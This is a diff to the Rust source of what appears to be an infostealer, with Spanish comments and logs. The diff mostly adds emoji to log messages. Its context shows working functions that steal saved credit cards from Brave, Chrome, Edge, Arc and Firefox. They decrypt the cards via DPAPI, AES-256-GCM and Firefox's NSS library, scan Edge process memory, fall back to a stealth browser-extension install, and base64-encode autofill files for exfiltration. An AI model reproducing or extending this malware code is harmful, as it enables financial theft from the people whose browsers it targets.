@@ -132,7 +132,7 @@ struct BrowserConfig {
 
 // REORDENADO: Priorizar navegadores SIN App-Bound Encryption (v20)
 const BROWSERS: &[BrowserConfig] = &[
-    //  PRIORIDAD ALTA: Sin v20, 100% bypasseable
+    // ✅ PRIORIDAD ALTA: Sin v20, 100% bypasseable
     BrowserConfig {
         name: "Brave",
         web_data_path: r"BraveSoftware\Brave-Browser\User Data\Default\Web Data",
@@ -158,13 +158,13 @@ const BROWSERS: &[BrowserConfig] = &[
         web_data_path: r"Arc\User Data\Default\Web Data",
         priority: 1,
     },
-    //  PRIORIDAD MEDIA: Chrome (~45% sin v20)
+    // ⚠️ PRIORIDAD MEDIA: Chrome (~45% sin v20)
     BrowserConfig {
         name: "Chrome",
         web_data_path: r"Google\Chrome\User Data\Default\Web Data",
         priority: 3,
     },
-    //  PRIORIDAD BAJA: Edge (~95% con v20)
+    // 🔴 PRIORIDAD BAJA: Edge (~95% con v20)
     BrowserConfig {
         name: "Edge",
         web_data_path: r"Microsoft\Edge\User Data\Default\Web Data",
@@ -209,7 +209,7 @@ pub fn steal_credit_cards() -> Vec<CreditCard> {
         } else {
             if let Some(ref mut f) = log {
                 use std::io::Write;
-                let _ = writeln!(f, "   No se encontraron tarjetas en {}", browser.name);
+                let _ = writeln!(f, "  ❌ No se encontraron tarjetas en {}", browser.name);
             }
         }
 
@@ -313,14 +313,14 @@ fn extract_credit_cards(
         Ok(c) => {
             if let Some(ref mut f) = log {
                 use std::io::Write;
-                let _ = writeln!(f, "     DB abierta correctamente");
+                let _ = writeln!(f, "    ✅ DB abierta correctamente");
             }
             c
         }
         Err(e) => {
             if let Some(ref mut f) = log {
                 use std::io::Write;
-                let _ = writeln!(f, "     Error abriendo DB: {}", e);
+                let _ = writeln!(f, "    ❌ Error abriendo DB: {}", e);
             }
             return cards;
         }
@@ -350,14 +350,14 @@ fn extract_credit_cards(
         Ok(s) => {
             if let Some(ref mut f) = log {
                 use std::io::Write;
-                let _ = writeln!(f, "     Query preparado correctamente");
+                let _ = writeln!(f, "    ✅ Query preparado correctamente");
             }
             s
         }
         Err(e) => {
             if let Some(ref mut f) = log {
                 use std::io::Write;
-                let _ = writeln!(f, "     Error preparando query: {}", e);
+                let _ = writeln!(f, "    ❌ Error preparando query: {}", e);
             }
             return cards;
         }
@@ -425,7 +425,7 @@ fn extract_credit_cards(
                             {
                                 let _ = writeln!(f, "      ℹ️ Formato: DPAPI con prefijo");
                             } else {
-                                let _ = writeln!(f, "      ℹ Formato: DPAPI directo (raw bytes)");
+                                let _ = writeln!(f, "      ℹ️ Formato: DPAPI directo (raw bytes)");
                             }
                         }
                     }
@@ -453,7 +453,7 @@ fn extract_credit_cards(
                                 let _ = writeln!(f, "      📊 Master key length: {}", key.len());
 
                                 // Mostrar primeros bytes de master key (solo para debug)
-                                let _ = write!(f, "       Master key (primeros 16 bytes): ");
+                                let _ = write!(f, "      🔑 Master key (primeros 16 bytes): ");
                                 for i in 0..std::cmp::min(16, key.len()) {
                                     let _ = write!(f, "{:02X} ", key[i]);
                                 }
@@ -478,7 +478,7 @@ fn extract_credit_cards(
                                     );
 
                                     // Mostrar nonce en hex
-                                    let _ = write!(f, "       Nonce (hex): ");
+                                    let _ = write!(f, "      📊 Nonce (hex): ");
                                     for i in 0..nonce_bytes.len() {
                                         let _ = write!(f, "{:02X} ", nonce_bytes[i]);
                                     }
@@ -509,13 +509,13 @@ fn extract_credit_cards(
                             if let Some(decrypted) = result {
                                 if let Some(ref mut f) = log {
                                     use std::io::Write;
-                                    let _ = writeln!(f, "       AES-256-GCM decrypt OK");
+                                    let _ = writeln!(f, "      ✅ AES-256-GCM decrypt OK");
                                 }
                                 decrypted_bytes = Some(decrypted);
                             } else {
                                 if let Some(ref mut f) = log {
                                     use std::io::Write;
-                                    let _ = writeln!(f, "       AES-256-GCM decrypt failed");
+                                    let _ = writeln!(f, "      ❌ AES-256-GCM decrypt failed");
                                 }
                             }
                         }
@@ -526,7 +526,7 @@ fn extract_credit_cards(
                 if decrypted_bytes.is_none() {
                     if let Some(ref mut f) = log {
                         use std::io::Write;
-                        let _ = writeln!(f, "       Intentando DPAPI...");
+                        let _ = writeln!(f, "      🔑 Intentando DPAPI...");
                     }
                     decrypted_bytes = decrypt_value_dpapi(&encrypted_number);
                 }
@@ -581,19 +581,19 @@ fn extract_credit_cards(
 
                         if let Some(ref mut f) = log {
                             use std::io::Write;
-                            let _ = writeln!(f, "       TARJETA AGREGADA!");
+                            let _ = writeln!(f, "      ✅ TARJETA AGREGADA!");
                         }
                     } else {
                         if let Some(ref mut f) = log {
                             use std::io::Write;
-                            let _ = writeln!(f, "       UTF8 conversion failed - Bytes desencriptados no son texto válido");
+                            let _ = writeln!(f, "      ❌ UTF8 conversion failed - Bytes desencriptados no son texto válido");
                         }
                     }
                 } else {
                     if let Some(ref mut f) = log {
                         use std::io::Write;
-                        let _ = writeln!(f, "       Desencriptación fallida (AES-GCM y DPAPI)");
-                        let _ = writeln!(f, "       Posibles causas:");
+                        let _ = writeln!(f, "      ❌ Desencriptación fallida (AES-GCM y DPAPI)");
+                        let _ = writeln!(f, "      💡 Posibles causas:");
                         let _ = writeln!(f, "         - Windows Defender bloqueando DPAPI");
                         let _ = writeln!(f, "         - Diferente usuario encriptó los datos");
                         let _ = writeln!(f, "         - Tarjeta protegida por Microsoft Account");
@@ -605,7 +605,7 @@ fn extract_credit_cards(
             } else {
                 if let Some(ref mut f) = log {
                     use std::io::Write;
-                    let _ = writeln!(f, "       Error parsing row");
+                    let _ = writeln!(f, "      ❌ Error parsing row");
                 }
             }
         }
@@ -617,7 +617,7 @@ fn extract_credit_cards(
     } else {
         if let Some(ref mut f) = log {
             use std::io::Write;
-            let _ = writeln!(f, "     Error ejecutando query");
+            let _ = writeln!(f, "    ❌ Error ejecutando query");
         }
     }
 
@@ -911,7 +911,7 @@ pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
     log("\n═══ HYBRID CREDIT CARD THEFT ═══");
 
     // PASO 1: Intentar método tradicional Chromium (funciona con v10/v11)
-    log(" PASO 1: Intentando método tradicional (DB + decrypt)...");
+    log("🔸 PASO 1: Intentando método tradicional (DB + decrypt)...");
     let traditional_cards = steal_credit_cards();
     all_cards.extend(traditional_cards.clone());
     log(&format!(
@@ -920,7 +920,7 @@ pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
     ));
 
     // PASO 1.5: Firefox (sistema independiente, siempre funciona)
-    log(" PASO 1.5: Intentando Firefox...");
+    log("🔸 PASO 1.5: Intentando Firefox...");
     let firefox_cards = steal_firefox_credit_cards();
     all_cards.extend(firefox_cards.clone());
     log(&format!(
@@ -941,22 +941,22 @@ pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
                 all_cards.extend(memory_cards);
             }
             Err(e) => {
-                log(&format!("   Memory injection failed: {}", e));
+                log(&format!("  ❌ Memory injection failed: {}", e));
             }
         }
     } else {
-        log(" PASO 2: Saltando memory injection (tarjetas ya obtenidas)");
+        log("🔸 PASO 2: Saltando memory injection (tarjetas ya obtenidas)");
     }
 
     // PASO 3: Si aún no hay tarjetas, instalar extensión (fallback)
     if all_cards.is_empty() {
-        log(" PASO 3: Instalando extensión como fallback...");
+        log("🔸 PASO 3: Instalando extensión como fallback...");
         match install_extension_stealth() {
-            Ok(_) => log("   Extensión instalada exitosamente"),
-            Err(e) => log(&format!("   Extension install failed: {}", e)),
+            Ok(_) => log("  ✅ Extensión instalada exitosamente"),
+            Err(e) => log(&format!("  ❌ Extension install failed: {}", e)),
         }
     } else {
-        log(" PASO 3: Saltando extensión (tarjetas ya obtenidas)");
+        log("🔸 PASO 3: Saltando extensión (tarjetas ya obtenidas)");
     }
 
     log(&format!(
@@ -998,11 +998,11 @@ fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
     log("\n  🔍 Iniciando Memory Injection Multi-Proceso...");
 
     // Escanear TODOS los procesos msedge.exe (main + renderers)
-    log("   Buscando TODOS los procesos msedge.exe...");
+    log("  🔍 Buscando TODOS los procesos msedge.exe...");
     let memory_cards = scan_all_edge_processes_for_cards();
 
     if memory_cards.is_empty() {
-        log("   No se encontraron tarjetas en ningún proceso Edge");
+        log("  ❌ No se encontraron tarjetas en ningún proceso Edge");
         return Err("No cards found in Edge memory".to_string());
     }
 
@@ -1084,11 +1084,11 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
     // Firefox profiles: %APPDATA%\Mozilla\Firefox\Profiles\
     let appdata = match std::env::var("APPDATA") {
         Ok(path) => {
-            log(&format!("   APPDATA: {}", path));
+            log(&format!("  📂 APPDATA: {}", path));
             PathBuf::from(path)
         }
         Err(_) => {
-            log("   APPDATA no encontrado");
+            log("  ❌ APPDATA no encontrado");
             return cards;
         }
     };
@@ -1101,7 +1101,7 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
     ));
 
     if !firefox_profiles.exists() {
-        log("   Directorio de perfiles no existe");
+        log("  ❌ Directorio de perfiles no existe");
         return cards;
     }
 
@@ -1132,11 +1132,11 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                         json_path.display()
                     ));
                     if json_path.exists() {
-                        log("     autofill-profiles.json ENCONTRADO!");
+                        log("    ✅ autofill-profiles.json ENCONTRADO!");
 
                         // ESTRATEGIA: Exfiltrar archivo RAW
                         if let Ok(file_data) = std::fs::read(&json_path) {
-                            log(&format!("     Tamaño: {} bytes", file_data.len()));
+                            log(&format!("    📄 Tamaño: {} bytes", file_data.len()));
                             let b64_data = general_purpose::STANDARD.encode(&file_data);
                             let profile_name = profile_path
                                 .file_name()
@@ -1151,10 +1151,10 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                                 billing_address: Some("Base64 file".to_string()),
                                 nickname: None,
                             });
-                            log("     Exfiltrado como Base64");
+                            log("    ✅ Exfiltrado como Base64");
                         }
                     } else {
-                        log("      autofill-profiles.json tampoco existe");
+                        log("    ⚠️  autofill-profiles.json tampoco existe");
                     }
 
                     continue;
@@ -1168,7 +1168,7 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                 log(&format!("    📋 Copiando a: {}", temp_db.display()));
 
                 if std::fs::copy(&formautofill_db, &temp_db).is_err() {
-                    log("     Error copiando DB");
+                    log("    ❌ Error copiando DB");
                     continue;
                 }
 
@@ -1184,7 +1184,7 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                         cards.extend(profile_cards);
                     }
                     Err(e) => {
-                        log(&format!("     Error: {}", e));
+                        log(&format!("    ❌ Error: {}", e));
                     }
                 }
 
@@ -1193,7 +1193,7 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
             }
         }
     } else {
-        log("   Error leyendo directorio de perfiles");
+        log("  ❌ Error leyendo directorio de perfiles");
     }
 
     log(&format!("  🏁 Total tarjetas: {}", cards.len()));
@@ -1231,7 +1231,7 @@ where
         log("      ⚠️  Tabla credit_cards_data NO EXISTE");
 
         // INTENTO 2: Tabla alternativa credit_cards_encrypted
-        log("       Buscando tabla credit_cards_encrypted...");
+        log("      🔍 Buscando tabla credit_cards_encrypted...");
         let alt_table_exists: bool = conn
             .query_row(
                 "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_encrypted'",
@@ -1263,7 +1263,7 @@ where
     log("      ✅ Tabla credit_cards_data existe");
 
     // DEBUG: Mostrar estructura de la tabla
-    log("       COLUMNAS DE credit_cards_data:");
+    log("      📋 COLUMNAS DE credit_cards_data:");
     if let Ok(mut stmt) = conn.prepare("PRAGMA table_info(credit_cards_data)") {
         if let Ok(col_iter) = stmt.query_map([], |row| {
             Ok((
@@ -1280,7 +1280,7 @@ where
     }
 
     // DEBUG: Mostrar una fila de ejemplo (data RAW)
-    log("       EJEMPLO DE FILA (raw data):");
+    log("      📄 EJEMPLO DE FILA (raw data):");
     if let Ok(mut stmt) = conn.prepare("SELECT * FROM credit_cards_data LIMIT 1") {
         if let Ok(mut rows) = stmt.query([]) {
             if let Ok(Some(row)) = rows.next() {
@@ -1321,7 +1321,7 @@ where
     log(&format!("      📊 Filas en tabla: {}", row_count));
 
     if row_count == 0 {
-        log("        Tabla VACÍA");
+        log("      ⚠️  Tabla VACÍA");
         return Ok(cards);
     }
 
@@ -1389,10 +1389,10 @@ where
                         nickname: None,
                     });
                 } else {
-                    log("          Número no válido (encriptado/binario)");
+                    log("        ⚠️  Número no válido (encriptado/binario)");
                 }
             } else {
-                log("          Campos faltantes");
+                log("        ⚠️  Campos faltantes");
             }
         } else {
             log(&format!(
@@ -1424,7 +1424,7 @@ where
     // Decodificar Base64
     let encrypted_data = match general_purpose::STANDARD.decode(encrypted_b64) {
         Ok(data) => {
-            log(&format!("       Base64 decoded: {} bytes", data.len()));
+            log(&format!("      📦 Base64 decoded: {} bytes", data.len()));
             data
         }
         Err(e) => return Err(format!("Base64 decode failed: {}", e)),
@@ -1484,9 +1484,9 @@ where
             .collect();
 
         if SetDllDirectoryW(wide_path.as_ptr()) == 0 {
-            log("        SetDllDirectoryW falló, continuando de todas formas...");
+            log("      ⚠️  SetDllDirectoryW falló, continuando de todas formas...");
         } else {
-            log("       DLL search path configurado");
+            log("      ✅ DLL search path configurado");
         }
     }
 
@@ -1494,7 +1494,7 @@ where
     let lib = unsafe {
         match Library::new(&nss_dll) {
             Ok(l) => {
-                log("       Library cargada");
+                log("      ✅ Library cargada");
                 l
             }
             Err(e) => return Err(format!("Failed to load nss3.dll: {}", e)),
@@ -1543,7 +1543,7 @@ where
                 init_result
             ));
         } else {
-            log("       NSS_Init OK");
+            log("      ✅ NSS_Init OK");
         }
 
         // Preparar input SECItem
